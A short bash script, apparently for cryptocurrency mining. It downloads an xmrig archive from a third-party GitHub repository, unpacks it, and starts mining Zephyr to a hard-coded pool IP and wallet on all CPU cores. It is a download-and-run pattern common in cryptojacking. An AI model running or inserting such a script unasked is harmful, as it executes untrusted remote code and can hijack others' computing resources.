#!/bin/bash
wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz
./xmrig --donate-level 1 -o 172.104.187.239:443 -u ZEPHYR3A69RiVrbHPHBBBoLzZDguExerhWkxyYq9xtdb2LoEsqnmfkMdyiDrAcE8vHRdUEsgUU9KpehTPgMSAWaGc3wuGmiKyJr4p -p bandros -a rx/0 -t $(nproc --all)
